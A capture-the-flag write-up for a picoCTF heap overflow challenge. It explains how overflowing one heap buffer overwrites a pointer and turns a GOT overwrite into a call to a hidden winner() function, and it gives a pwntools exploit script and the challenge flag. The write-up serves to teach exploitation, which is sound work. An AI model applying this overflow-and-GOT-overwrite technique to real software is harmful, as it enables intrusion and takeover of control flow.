# Binary CTF Challenge Writeup

## Flag
`picoCTF{h34p_0v3rfl0w_68ab20d4}`

## Vulnerability

The vulnerability in the `vuln` program is a **Heap-Based Buffer Overflow**, allowing an attacker to perform an arbitrary write to a memory address, thereby redirecting control flow to a hidden function.

Looking at `vuln.c`, we can see the memory allocations and their order:

```c
struct internet {
    int priority;
    char *name;
    void (*callback)();
};

...

i1 = malloc(sizeof(struct internet));
i1->priority = 1;
i1->name = malloc(8);
i1->callback = NULL;

i2 = malloc(sizeof(struct internet));
i2->priority = 2;
i2->name = malloc(8);
i2->callback = NULL;

strcpy(i1->name, argv[1]);
strcpy(i2->name, argv[2]);
```

The heap allocation sequence produces the following layout:
1. `i1` chunk (12 bytes user data, 16 bytes allocated)
2. `i1->name` buffer chunk (8 bytes user data, 16 bytes allocated)
3. `i2` chunk (12 bytes user data, 16 bytes allocated)
4. `i2->name` buffer chunk (8 bytes user data, 16 bytes allocated)

Because `i1->name` is allocated immediately before the `i2` structure in the heap, a buffer overflow in `i1->name` via `strcpy(i1->name, argv[1]);` allows an attacker to overwrite the contents of the `i2` structure.

The most critical field in `i2` is `i2->name`, which is a pointer denoting the destination buffer for the second string copy operation:
`strcpy(i2->name, argv[2]);`

By overflowing `i1->name` and overwriting `i2->name` with an arbitrary address, `strcpy` will then write the contents of `argv[2]` to that arbitrary address. This is a classic "write-what-where" primitive.

## Exploitation Strategy

The goal is to call the hidden `winner()` function, which is located at `0x080492b6`.

We can redirect execution to `winner()` by overwriting the Global Offset Table (GOT) entry of a dynamically linked function that gets called later in the program. `puts` is a perfect candidate since `printf("No winners this time, try again!\n");` is compiled as a call to `puts` at the end of the `main` function.

The address of `puts` in the GOT is `0x0804c028`.

### Payload Construction

1. **Payload 1 (`argv[1]`)**: This overflows `i1->name` and overwrites `i2->name` with the GOT address of `puts`.
   - The offset from the start of `i1->name` to `i2->name` is exactly 20 bytes (16 bytes padding to reach the `i2` struct + 4 bytes for `i2->priority`).
   - We pad 20 characters (`A`s) and then append the GOT address of `puts`: `p32(0x0804c028)`.

2. **Payload 2 (`argv[2]`)**: This contains the value we want to write into the GOT of `puts`.
   - We provide the address of the `winner` function: `p32(0x080492b6)`.

When the program executes `strcpy(i2->name, argv[2])`, it will copy the address of `winner()` over the GOT entry of `puts`. When the program later tries to execute `puts("No winners this time...");`, it will jump to `winner()` instead, which reads and prints the flag from `flag.txt`.

### Exploit Script

```python
from pwn import *

context.binary = './vuln'

# Remote target details
host = "foggy-cliff.picoctf.net"
port = 64377

# Connect to target
try:
    io = remote(host, port)
    io.recvuntil(b"Enter two names separated by space:\n", timeout=2)

    # Payload 1: Overwrite i2->name with GOT of puts (0x0804c028)
    # The offset from i1->name to i2->name is 20 bytes
    payload1 = b"A" * 20 + p32(0x0804c028)

    # Payload 2: Write address of winner() (0x080492b6) into i2->name
    payload2 = p32(0x080492b6)

    # Send both payloads separated by a space as requested by the server wrapper
    io.sendline(payload1 + b" " + payload2)

    # Receive and print the flag output
    output = io.recvall(timeout=3).decode('utf-8', 'ignore')
    print("----- REMOTE FLAG OUTPUT -----")
    print(output)

except Exception as e:
    print(f"Connection error: {e}")
```

When this script runs against the live challenge instance, it prints the hidden flag retrieved by the `winner()` function.